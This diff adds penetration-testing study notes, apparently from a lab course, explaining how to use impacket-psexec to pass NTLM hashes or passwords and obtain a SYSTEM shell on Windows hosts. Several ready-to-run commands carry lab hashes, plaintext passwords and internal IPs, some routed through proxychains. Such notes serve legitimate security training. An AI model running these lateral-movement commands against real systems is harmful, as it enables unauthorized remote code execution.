@@ -1,1 +1,21 @@
+To execute psexec, we can enter impacket-psexec with two arguments. 
+The first argument is -hashes, which allows us to use NTLM hashes to authenticate to the target. 
+The format is "LMHash:NTHash", in which we specify the Administrator NTLM hash after the colon. 
+Since we only use the NTLM hash, we can fill the LMHash section with 32 0's.
 
+The second argument is the target definition in the format "username@ip".
+
+At the end of the command we could specify another argument, which is used to determine which command psexec should execute on the target system.
+ If we leave it empty, cmd.exe will be executed, providing us with an interactive shell.
+
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.x
+
+kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.x
+
+We successfully obtained an interactive shell on FILES02. 
+Due to the nature of psexec.py, we'll always receive a shell as SYSTEM instead of the user we used to authenticate.
+
+└─$ proxychains impacket-psexec joe:Flowers1@172.16.193.x                                                    
+└─$ sudo proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.101.146  
+
+└─$ python3 psexec.py  relia/Administrator:'vau!XCKjNQBv2$'@172.16.125.x    
